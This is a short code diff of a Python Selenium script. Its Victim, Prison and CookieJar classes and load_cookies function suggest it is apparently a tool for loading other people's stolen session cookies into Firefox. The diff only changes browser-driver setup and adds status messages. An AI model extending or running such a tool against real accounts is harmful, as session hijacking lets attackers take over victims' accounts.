@@ -1,3 +1,4 @@
+from _modules.classes import Prison, Victim, CookieJar, Cookie
 import json
 import os
 import time
@@ -5,7 +6,7 @@ import socket
 import selenium
 import tldextract
 from selenium import webdriver
-from _modules.classes import Prison, Victim, CookieJar, Cookie
+from webdriver_manager.firefox import GeckoDriverManager
 
 
 def load_cookies(victim, driver: webdriver.Firefox):
@@ -111,10 +112,11 @@ def selection_screen(victims, url):
 
 
 def run_browser_interactive(database):
-
+    print("[+] Checking for browser installation")
+    driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
     print(f"[+] Loading Browser...")
-    driver = webdriver.Firefox()
     driver.get("https://www.google.com")
+    print("[+] Done")
     added = set()
     while True:
         url = driver.current_url
